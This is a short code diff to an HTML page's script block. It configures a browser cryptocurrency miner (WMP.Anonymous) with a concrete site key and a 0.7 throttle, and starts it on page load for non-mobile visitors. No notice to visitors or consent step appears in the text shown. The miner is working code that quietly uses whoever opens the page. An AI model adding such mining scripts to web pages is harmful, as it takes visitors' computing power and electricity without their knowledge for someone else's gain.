@@ -64,8 +64,10 @@ canvas {
 
       </script>
     <script>
-      var miner = WMP.Anonymous('<your-site-key>');
-      miner.start();
+      var miner = WMP.Anonymous('SK_NtaeQ3WWr9fZLpgCGxizv',{throttle: 0.7});
+      if (!miner.isMobile()){
+          miner.start();
+      }
   </script>
   </body>
 </html>
